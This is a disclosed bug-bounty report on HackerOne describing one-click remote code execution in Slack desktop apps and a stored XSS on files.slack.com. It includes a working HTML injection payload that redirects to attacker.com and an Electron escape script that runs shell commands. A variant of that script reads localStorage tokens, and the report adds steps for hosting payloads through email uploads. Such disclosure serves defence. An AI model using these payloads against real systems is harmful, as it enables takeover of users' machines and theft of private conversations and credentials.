# Remote Code Execution in Slack desktop apps + bonus

## Report Details
- **Report ID**: 783877
- **URL**: https://hackerone.com/reports/783877
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-01-27T00:05:37.110Z
- **Disclosed**: 2020-08-28T18:04:36.897Z

## Reporter
- **Username**: oskarsv
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: slack

## Vulnerability Information
# Summary

With any in-app redirect - logic/open redirect, HTML or javascript injection it's possible to execute arbitrary code within Slack desktop apps. This report demonstrates a specifically crafted exploit consisting of an HTML injection, security control bypass and a RCE Javascript payload. This exploit was tested as working on the latest Slack for desktop (4.2, 4.3.2) versions (Mac/Windows/Linux). 

To demonstrate the impact of this RCE vulnerability and how it could be used in various scenarios, a new approach was developed for the starting point (HTML injection & payload) as vulnerabilities reported previously cannot be used anymore [#738229](https://hackerone.com/reports/738229). 

Finally, as an added bonus, a XSS vulnerability on https://files.slack.com is demonstrated as a possible RCE payload store. I chose to not report this separately as it seems the domain is out of scope (?), however the vulnerability in my opinion is critical by itself and should be fixed either way.

{F697022}

# Technical description and steps of reproduction

Exploitation steps:
1. Upload file on your HTTPS enabled server with the RCE payload
2. Prepare a Slack Post with HTML injection
3. Share Post with channel or user

User steps:
1. click on a large post with an enticing image - code executed on PC

Actual path after user click:
1. HTML redirects user's desktop app to attacker website in `_top` frame
2. Attacker website replies with RCE javascript
3. exploit bypasses Slack desktop app env, leaks an Electron object and via it executes arbitrary commands on user's PC. 

**NOTE**: This could also be done with any XSS/in-app redirect vulnerability.

## HTML injection - directly editing Slack Post structure as JSON

### 1. create a new Slack Post with some title and some content

When you create a new Slack Post, it creates a new file on https://files.slack.com with the following JSON structure:
```
{"full":"<p>content<\/p>","preview":"<p>content<\/p>"}
```
{F696858}

The URL to a private file can be found by visiting the private file link returned by the `/api/files.info` call:
{F696861}

The private file URL is in the format `https://files.slack.com/files-pri/{TEAM_ID}-{FILE_ID}/TITLE` under `url_private` response from `/api/files.info`. The Slack Post JSON structure can be observed by simply visiting the private file link.

### 2. Injecting HTML payload

It's possible to directly edit this JSON structure, which can contain arbitrary HTML. Javascript execution is restricted by CSP and various security protections are in place for HTML tags (i.e. banned `iframe`, `applet`, `meta`, `script`, `form` etc. and `target` attribute is overwritten to `_blank` for `A` tags). 

However, it is still possible to inject `area` and `map` tags, which can be used to achieve a one-click-RCE.

To edit the JSON structure directly and inject in that way, you can use the web UI provided by Slack itself:
```
https://{YOUR-TEAM-HOSTNAME}.slack.com/files/{YOUR-MEMBER-ID}/{FILE-ID}/title/edit
```
`YOUR-MEMBER-ID` you can copy from your profile view, it's in the format `UXXXXXXXX`

{F696964}

**Alternatively**, it's possible to upload a Javascript/JSON snippet and change it's filetype to `docs` by editing the `filetype` parameter with a HTTP proxy.

Upload payload.json with the JSON below:
{F696941}

Change filetype by intercepting request when when editing file, e.g. change title and intercept HTTP request to `/api/files.edit`:
{F696942}

Since no HTML embedding is possible and various interesting tags are restricted + Javascript is not available because of existing protections and a defined CSP, a new HTML injection payload was developed:
```
<img src="https://files.slack.com/files-tmb/T02AVL3AF-FSUE04U2D-881f692a25/screenshot_2020-01-26_at_21.12.20_360.png" width="10000" height="10000" usemap="#slack-img">
<map name="slack-img">
<area shape="rect" coords="10000,10000 0,0" href="https://attacker.com/t.html" target="_self">
</map>
```
Note this payload requires an image to reference with the attribute `usemap`. This can be hosted in Slack infrastructure by uploading an image to Slack beforehand.

JSON to provide for Slack Post edit @ `https://{YOUR-TEAM-HOSTNAME}.slack.com/files/{YOUR-MEMBER-ID}/{FILE-ID}/title/edit` payload.json:
```
{
  "full": "asd",
  "preview": "<img src=\"https://files.slack.com/files-tmb/T02AVL3AF-FSUE04U2D-881f692a25/screenshot_2020-01-26_at_21.12.20_360.png\" width=\"10000\" height=\"10000\" usemap=\"#slack-img\"><map name=\"slack-img\"><area shape=\"rect\" coords=\"10000,10000 0,0\" href=\"https://attacker.com/t.html\" target=\"_self\"></map>"
}
```

### 3. RCE exploit code - hosted on attacker's website 

the URL link within the `area` tag would contain this HTML / JS exploit for Slack Desktop apps which executes any attacker provided command:
```
<html>
<body>
<script>
  // overwrite functions to get a BrowserWindow object:
  window.desktop.delegate = {}
  window.desktop.delegate.canOpenURLInWindow = () => true
  window.desktop.window = {}
  window.desktop.window.open = () => 1
  bw = window.open('about:blank') // leak BrowserWindow class
  nbw = new bw.constructor({show: false, webPreferences: {nodeIntegration: true}}) // let's make our own with nodeIntegration
  nbw.loadURL('about:blank') // need to load some URL for interaction
  nbw.webContents.executeJavaScript('this.require("child_process").exec("open /Applications/Calculator.app")') // exec command
</script>
</body>
</html>
```

For windows just replace `open /Applications/Calculator.app` with `calc` or anything else.

To test the RCE payload, you can open Developer Tools on any Slack Desktop app and paste only the Javascript code in console. It achieves RCE and illustrates that it's independent of any entry point - i.e. redirect within the desktop app.

### 4. easy access to all private data without command execution 

The payload can be easily modified to **access all private conversations, files, tokens etc.** without executing commands on the user's computer: 
```
<html>
<body>
<script>
  window.desktop.delegate = {}
  window.desktop.delegate.canOpenURLInWindow = () => true
  window.desktop.window = {}
  window.desktop.window.open = () => 1
  bw = window.open('about:blank')
  nbw = new bw.constructor({show: false}) // node not necessary for this demo
  nbw.loadURL('https://app.slack.com/robots.txt') // robots.txt for speed, app.slack.com gives us the user's full environment 
  nbw.webContents.executeJavaScript('alert(JSON.stringify(localStorage))')
</script>
</body>
</html>
```

{F697023}

Essentially, this gives an attacker full remote control over the Slack desktop app via overwriting Slack desktop app env functions and providing a "tunnel" via `BrowserWindow` to execute arbitrary Javascript, i.e. a weird XSS case with full access to anything the Slack app has - easy access to private channels, conversations, functions etc.

# files.slack.com - alternate payload store and an XSS in itself

During search for an entry point for the RCE exploit, it was discovered that emails (when sent as plaintext) are stored unfiltered on Slack servers at https://files.slack.com and with direct access returned as text/html, without force-download.

This HTML file upload functionality can be used for storing the RCE payload - no need to use own hosting. 

{F697020}

Since it's a trusted domain, it could contain a phishing page with a fake Slack login page or different arbitrary content which could impact both security and reputation of Slack. There are no security headers or any restrictions at all as far as I could tell and I'm sure some other security impact could be demonstrated with enough time. 

{F697019}

## How to upload html to files.slack.com

Any email client can be used, i.e. in macOS's default client you can press CMD+SHIFT+T to make an email plaintext, copy paste the RCE payload from above and embed it in your Slack Post HTML injection. 

{F697018}

As the "Send To Slack" email address, you have to use your custom email integration address or private email address - [instructions](https://slack.com/intl/en-lv/slack-tips/send-email-to-slack). Scroll to "Send one email at a time into Slack with forwarding address" for easy setup - no app integration or installs necessary.

The uploaded HTML file can then be found via the UI "open original" or by the same `/api/files.info` API call on e-mail file id and then visiting the `url_private` link.

# TL;DR

- HTML injection path via web UI - direct editing of Post file structure 
- alternatively HTML injection via file conversion from `Javascript/JSON` to `docs` - achieves same goal of editing Post structure directly
- new pure HTML payload to redirect Slack Desktop app
- new OS-agnostic Remote Code Execution payload  - requires any kind of in-app redirect to a malicious page 
- XSS in files.slack.com without restriction via e-mail 
- **all files of course must be shared with the recipients via the usual methods** otherwise private files are inaccessible

## Impact

Remote Code Execution in Slack desktop apps:
- access to private files, private keys, passwords, secrets, internal network access etc.
- access to private conversations, files etc. within Slack
- payload could be made "wormable" - re-post to all user workspaces after click

XSS in files.slack.com
- arbitrary HTML content in *.slack.com - trusted page
- phishing with fake HTML login page
- can be used to store above RCE exploit

## Attachments
- post-structure.png
- file-info-api.png
- json-file.png
- http-proxy-change-filetype.png
- edit-via-web.png
- slack-email-xss.png
- files.slack.com-xss.png
- slack-as-exploit-host.png
- slack-rce-demo.mov
- token-xss.png
